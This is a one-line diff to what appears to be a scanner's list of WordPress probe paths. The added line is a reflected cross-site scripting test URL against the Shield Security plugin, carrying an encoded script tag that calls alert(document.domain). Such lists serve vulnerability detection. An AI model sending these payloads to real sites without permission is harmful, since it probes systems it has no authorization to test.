@@ -342,3 +342,4 @@
 /wp-json/lottiefiles/v1/settings/
 /wp-content/plugins/wp-content-permission/readme.txt
 /wp-content/uploads/{{logname}}.log
+/?action=shield_action&ex=display_full_page_dynamic&render_slug=render_shield_wploginreplica_header&title=nuclei&message=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
